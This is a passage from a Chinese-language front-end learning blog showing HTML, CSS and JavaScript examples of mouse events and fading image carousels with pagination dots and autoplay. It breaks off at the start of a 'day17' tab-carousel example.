class="comment">//ondblclick 双击事件</span></span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> btn=<span class="built_in">document</span>.getElementsByTagName(<span class="string">&quot;button&quot;</span>)[<span class="number">0</span>];</span></span><br><span class="line"><span class="javascript">        btn.ondblclick=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span></span></span><br><span class="line">        &#123;</span><br><span class="line"><span class="javascript">            alert(<span class="string">&quot;双击事件提示&quot;</span>);</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="javascript">        <span class="comment">//鼠标移入移出的两组DOM事件，与hover类似但比hover强大，应用:鼠标移入轮播图不轮播，移出继续</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//onmouseover   onmouseout 支持事件冒泡</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//onmouseenter  onmouseleave 不支持事件冒泡</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//两者差别只在于是否支持事件冒泡</span></span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> div=<span class="built_in">document</span>.getElementsByTagName(<span class="string">&quot;div&quot;</span>)[<span class="number">0</span>];</span></span><br><span class="line"><span class="javascript">        div.onmouseenter=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span></span></span><br><span class="line">        &#123;</span><br><span class="line"><span class="javascript">            <span class="built_in">console</span>.log(<span class="string">&quot;in&quot;</span>);</span></span><br><span class="line"><span class="javascript">            <span class="built_in">this</span>.style.transform=<span class="string">&quot;scale(1.3)&quot;</span>;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">this</span>.style.background=<span class="string">&quot;green&quot;</span>;</span></span><br><span class="line"><span class="javascript">            <span class="comment">//this.style.cssText=&quot;background:url(./img/Tuscany_Italy_1.jpg) no-repeat center/cover;&quot;</span></span></span><br><span class="line">        &#125;</span><br><span class="line"><span class="javascript">        div.onmouseleave=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span></span></span><br><span class="line">        &#123;</span><br><span class="line"><span class="javascript">            <span class="built_in">console</span>.log(<span class="string">&quot;out&quot;</span>);</span></span><br><span class="line"><span class="javascript">            <span class="built_in">this</span>.style.transform=<span class="string">&quot;scale(0.7)&quot;</span>;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">this</span>.style.background=<span class="string">&quot;yellow&quot;</span>;</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="javascript">        <span class="comment">//-------------------------------------</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//鼠标按下，鼠标抬起</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//onmousedown onmouseup</span></span></span><br><span class="line"><span class="javascript">        div.onmousedown=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span></span></span><br><span class="line">        &#123;</span><br><span class="line"><span class="javascript">            <span class="built_in">console</span>.log(<span class="string">&quot;onmousedown&quot;</span>)</span></span><br><span class="line">        &#125;</span><br><span class="line"><span class="javascript">        div.onmouseup = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span></span></span><br><span class="line">        &#123;</span><br><span class="line"><span class="javascript">            <span class="built_in">console</span>.log(<span class="string">&quot;onmouseup&quot;</span>)</span></span><br><span class="line">        &#125;</span><br><span class="line"><span class="javascript">        <span class="comment">//-------------------------------</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//鼠标移动 onmousemove,一直移动一直触发，应用：拖拽，放大镜，博客鼠标移动的星星效果</span></span></span><br><span class="line"><span class="javascript">        div.onmousemove=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span></span></span><br><span class="line">        &#123;</span><br><span class="line"><span class="javascript">            <span class="built_in">console</span>.log(<span class="string">&quot;mouse is moving&quot;</span>);</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="javascript">        <span class="comment">//--------------------------------</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//轮播图</span></span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> btn=<span class="built_in">document</span>.getElementsByTagName(<span class="string">&quot;button&quot;</span>);</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> oli=<span class="built_in">document</span>.getElementsByTagName(<span class="string">&quot;li&quot;</span>);<span class="comment">//返回length=6的li伪数组</span></span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> index=<span class="number">0</span>;</span></span><br><span class="line"><span class="javascript">        btn[<span class="number">2</span>].onclick=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span></span></span><br><span class="line">        &#123;</span><br><span class="line">            index++;</span><br><span class="line"><span class="javascript">            <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;oli.length;i++)</span></span><br><span class="line">            &#123;</span><br><span class="line"><span class="javascript">                oli[i].style.display=<span class="string">&quot;none&quot;</span>;</span></span><br><span class="line">            &#125;</span><br><span class="line"><span class="javascript">            <span class="keyword">if</span>(index&gt;<span class="number">5</span>)<span class="comment">//n张图，单向最大点击n-1次，这里也可以用==，大于更保险</span></span></span><br><span class="line">            &#123;</span><br><span class="line"><span class="javascript">                index=<span class="number">0</span>;<span class="comment">//实现单向循环</span></span></span><br><span class="line">            &#125;</span><br><span class="line"><span class="javascript">            oli[index].style.display=<span class="string">&quot;block&quot;</span>;</span></span><br><span class="line">        &#125;</span><br><span class="line"><span class="javascript">        <span class="comment">//灵魂发问：如果需要过渡渐变效果，在哪里添加transition有效？li和button都试了，似乎没用，why？</span></span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="day16-轮播图"><a href="#day16-轮播图" class="headerlink" title="day16 轮播图"></a>day16 轮播图</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>day16 mi.com官网淡入淡出轮播图<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line">        *&#123;</span><br><span class="line"><span class="css">            <span class="comment">/* 通配符选择器 */</span></span></span><br><span class="line"><span class="css">          <span class="attribute">margin</span>: <span class="number">0</span>;  </span></span><br><span class="line"><span class="css">          <span class="attribute">padding</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="css">          <span class="attribute">list-style</span>: none;</span></span><br><span class="line">        &#125;</span><br><span class="line">        .banner&#123;</span><br><span class="line"><span class="css">            <span class="attribute">width</span>: <span class="number">1000px</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">height</span>: <span class="number">400px</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">margin</span>: <span class="number">100px</span> auto;</span></span><br><span class="line"><span class="css">            <span class="comment">/* box-shadow:0 0 2px 0 red; */</span></span></span><br><span class="line"><span class="css">            <span class="attribute">position</span>: relative;</span></span><br><span class="line">        &#125;</span><br><span class="line"><span class="css">        <span class="selector-class">.banner</span> <span class="selector-tag">ul</span> <span class="selector-tag">li</span>&#123;</span></span><br><span class="line"><span class="css">            <span class="attribute">width</span>: <span class="number">1000px</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">height</span>: <span class="number">400px</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">position</span>: absolute;</span></span><br><span class="line"><span class="css">            <span class="comment">/* 定位，脱离文档流，一般需要在外层添加relative定位作为参考坐标系 */</span></span></span><br><span class="line"><span class="css">            <span class="attribute">opacity</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="css">            <span class="comment">/* 解决上次疑问：淡入淡出效果使用display的none和block是行不通的，none和block对应于0和1，中间没有过渡值，而使用opacity可以实现淡入淡出效果，transition才会发挥作用 */</span></span></span><br><span class="line"><span class="css">            <span class="attribute">transition</span>: <span class="number">2s</span>;</span></span><br><span class="line">        &#125;</span><br><span class="line"><span class="css">        <span class="selector-class">.banner</span> <span class="selector-tag">ul</span> <span class="selector-tag">li</span> <span class="selector-tag">img</span>&#123;</span></span><br><span class="line"><span class="css">            <span class="attribute">width</span>: <span class="number">100%</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">height</span>: <span class="number">100%</span>;</span></span><br><span class="line">        &#125;</span><br><span class="line"><span class="css">        <span class="selector-tag">button</span>&#123;</span></span><br><span class="line"><span class="css">            <span class="attribute">border</span>:none;</span></span><br><span class="line"><span class="css">            <span class="comment">/* button默认边框样式清除 */</span></span></span><br><span class="line"><span class="css">            <span class="attribute">width</span>: <span class="number">40px</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">height</span>: <span class="number">70px</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">position</span>: absolute;</span></span><br><span class="line"><span class="css">            <span class="comment">/* box-shadow: 0 0 2px 0 blue; */</span></span></span><br><span class="line"><span class="css">            <span class="attribute">top</span>: <span class="number">170px</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">outline</span>: none;</span></span><br><span class="line">        &#125;</span><br><span class="line"><span class="css">        <span class="selector-tag">button</span><span class="selector-pseudo">:nth-of-type</span>(<span class="number">1</span>)&#123;</span></span><br><span class="line"><span class="css">            <span class="attribute">background</span>: <span class="built_in">url</span>(<span class="string">./img/icon-slides.png</span>) no-repeat -<span class="number">88px</span> <span class="number">0px</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">left</span>: <span class="number">0px</span>;</span></span><br><span class="line">        &#125;</span><br><span class="line"><span class="css">        <span class="selector-tag">button</span><span class="selector-pseudo">:nth-of-type</span>(<span class="number">2</span>)&#123;</span></span><br><span class="line"><span class="css">            <span class="attribute">background</span>: <span class="built_in">url</span>(<span class="string">./img/icon-slides.png</span>) no-repeat -<span class="number">130px</span> <span class="number">0px</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">right</span>: <span class="number">0px</span>;</span></span><br><span class="line">        &#125;</span><br><span class="line"><span class="css">        <span class="selector-tag">ol</span>&#123;</span></span><br><span class="line"><span class="css">            <span class="attribute">width</span>: <span class="number">68px</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">height</span>: <span class="number">10px</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">position</span>: absolute;</span></span><br><span class="line"><span class="css">            <span class="attribute">bottom</span>: <span class="number">18px</span>;<span class="attribute">right</span>: <span class="number">32px</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">display</span>: flex;</span></span><br><span class="line"><span class="css">            <span class="comment">/* 这里使用弹性盒模型，自动撑开的宽度的效果 */</span></span></span><br><span class="line"><span class="css">            <span class="attribute">justify-content</span>: space-between;</span></span><br><span class="line"><span class="css">            <span class="comment">/* 配合flex使用，平均内容的宽度 */</span></span></span><br><span class="line">        &#125;</span><br><span class="line"><span class="css">        <span class="selector-tag">ol</span>&gt;<span class="selector-tag">li</span>&#123;</span></span><br><span class="line"><span class="css">            <span class="attribute">width</span>: <span class="number">6px</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">height</span>: <span class="number">6px</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">border</span>: <span class="number">2px</span> solid <span class="built_in">hsla</span>(<span class="number">0</span>,<span class="number">0%</span>,<span class="number">100%</span>,.<span class="number">3</span>);</span></span><br><span class="line"><span class="css">            <span class="attribute">background</span>: <span class="built_in">rgba</span>(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,.<span class="number">4</span>);</span></span><br><span class="line"><span class="css">            <span class="attribute">border-radius</span>: <span class="number">50%</span>;</span></span><br><span class="line">        &#125;</span><br><span class="line">        .cls&#123;</span><br><span class="line"><span class="css">            <span class="attribute">background</span>: <span class="built_in">hsla</span>(<span class="number">0</span>,<span class="number">0%</span>,<span class="number">100%</span>,.<span class="number">4</span>);</span></span><br><span class="line"><span class="css">            <span class="attribute">border-color</span>: <span class="built_in">rgba</span>(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,.<span class="number">4</span>);</span></span><br><span class="line">        &#125;</span><br><span class="line"><span class="css">        <span class="selector-tag">ol</span>&gt;<span class="selector-tag">li</span><span class="selector-pseudo">:hover</span>&#123;</span></span><br><span class="line"><span class="css">            <span class="attribute">background</span>: <span class="built_in">hsla</span>(<span class="number">0</span>,<span class="number">0%</span>,<span class="number">100%</span>,.<span class="number">4</span>);</span></span><br><span class="line"><span class="css">            <span class="attribute">border-color</span>: <span class="built_in">rgba</span>(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,.<span class="number">4</span>);</span></span><br><span class="line">        &#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;banner&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span> <span class="attr">style</span>=<span class="string">&quot;opacity: 1;&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;./img/1.jpg&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;./img/2.webp&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;./img/3.webp&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;./img/4.webp&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">button</span>&gt;</span><span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">button</span>&gt;</span><span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">ol</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;cls&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">ol</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> btn=<span class="built_in">document</span>.getElementsByTagName(<span class="string">&quot;button&quot;</span>);</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> oul=<span class="built_in">document</span>.getElementsByTagName(<span class="string">&quot;ul&quot;</span>)[<span class="number">0</span>];</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> ul_li=oul.getElementsByTagName(<span class="string">&quot;li&quot;</span>);</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> ool=<span class="built_in">document</span>.getElementsByTagName(<span class="string">&quot;ol&quot;</span>)[<span class="number">0</span>];</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> ol_li=ool.getElementsByTagName(<span class="string">&quot;li&quot;</span>);</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> index=<span class="number">0</span>;</span></span><br><span class="line"><span class="javascript">        run=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line">            index++;</span><br><span class="line"><span class="javascript">                    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; ul_li.length; i++) &#123;</span></span><br><span class="line"><span class="javascript">                        ul_li[i].style.opacity = <span class="string">&quot;0&quot;</span>;</span></span><br><span class="line"><span class="javascript">                        ol_li[i].className = <span class="string">&quot;none&quot;</span>;<span class="comment">//或者直接写“”</span></span></span><br><span class="line">                    &#125;</span><br><span class="line">                    if (index == ul_li.length) &#123; index = 0 &#125;;</span><br><span class="line"><span class="javascript">                    ul_li[index].style.opacity = <span class="string">&quot;1&quot;</span>;</span></span><br><span class="line"><span class="javascript">                    ol_li[index].className=<span class="string">&quot;cls&quot;</span>;</span></span><br><span class="line">        &#125;</span><br><span class="line">        btn[1].onclick=run;</span><br><span class="line"><span class="javascript">        btn[<span class="number">0</span>].onclick = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line">                index--;</span><br><span class="line"><span class="javascript">                <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; ul_li.length; i++) &#123;</span></span><br><span class="line"><span class="javascript">                    ul_li[i].style.opacity = <span class="string">&quot;0&quot;</span>;</span></span><br><span class="line"><span class="javascript">                    ol_li[i].className=<span class="string">&quot;none&quot;</span>;</span></span><br><span class="line">                &#125;</span><br><span class="line">                if (index == -1) &#123; index = ul_li.length-1 &#125;;</span><br><span class="line"><span class="javascript">                ul_li[index].style.opacity = <span class="string">&quot;1&quot;</span>;</span></span><br><span class="line"><span class="javascript">                ol_li[index].className = <span class="string">&quot;cls&quot;</span>;</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line"><span class="javascript">            <span class="comment">//自动切换 </span></span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> timer;</span></span><br><span class="line"><span class="javascript">            timer = <span class="built_in">setInterval</span>(run, <span class="number">2000</span>);</span></span><br><span class="line"></span><br><span class="line"><span class="javascript">            <span class="comment">//鼠标移入，鼠标移出</span></span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> banner=<span class="built_in">document</span>.getElementsByClassName(<span class="string">&quot;banner&quot;</span>)[<span class="number">0</span>];</span></span><br><span class="line"><span class="javascript">            banner.onmouseover=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="built_in">clearInterval</span>(timer);</span></span><br><span class="line"><span class="javascript">                <span class="built_in">console</span>.log(<span class="string">&quot;in&quot;</span>);</span></span><br><span class="line"><span class="javascript">                <span class="comment">//分页器，轮播图右下角的圈圈，点击跳转到对应下标的图片，本质上是选项卡</span></span></span><br><span class="line"><span class="javascript">                <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;ol_li.length;i++)</span></span><br><span class="line">                &#123;</span><br><span class="line"><span class="javascript">                    ol_li[i].temp=i;<span class="comment">//给每一个ol下的li分配一个叫temp的属性，用来存放下标值i</span></span></span><br><span class="line"><span class="javascript">                    ol_li[i].onclick=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                        <span class="comment">//给每一个ol下li元素绑定一个点击事件</span></span></span><br><span class="line"><span class="javascript">                        <span class="keyword">for</span>(<span class="keyword">var</span> j=<span class="number">0</span>;j&lt;ul_li.length;j++)</span></span><br><span class="line"><span class="javascript">                        &#123;<span class="comment">//清除样式</span></span></span><br><span class="line"><span class="javascript">                            ul_li[j].style.opacity=<span class="string">&quot;0&quot;</span>;</span></span><br><span class="line"><span class="javascript">                            ol_li[j].className=<span class="string">&quot;&quot;</span>;</span></span><br><span class="line">                        &#125;</span><br><span class="line"><span class="javascript">                        index=<span class="built_in">this</span>.temp;<span class="comment">//这里的this指向事件触发源，即按钮点击事件</span></span></span><br><span class="line"><span class="javascript">                        ul_li[index].style.opacity=<span class="string">&quot;1&quot;</span>;</span></span><br><span class="line"><span class="javascript">                        <span class="built_in">this</span>.className=<span class="string">&quot;cls&quot;</span>;</span></span><br><span class="line"><span class="javascript">                        <span class="comment">// ol_li[index].className=&quot;cls&quot;;</span></span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"><span class="javascript">            banner.onmouseout=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                timer=<span class="built_in">setInterval</span>(run,<span class="number">2000</span>);</span></span><br><span class="line"><span class="javascript">                <span class="built_in">console</span>.log(<span class="string">&quot;out&quot;</span>);</span></span><br><span class="line">            &#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="day17-选项卡轮播图"><a href="#day17-选项卡轮播图" class="headerlink" title="day17 选项卡轮播图"></a>day17 选项卡轮播图</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span 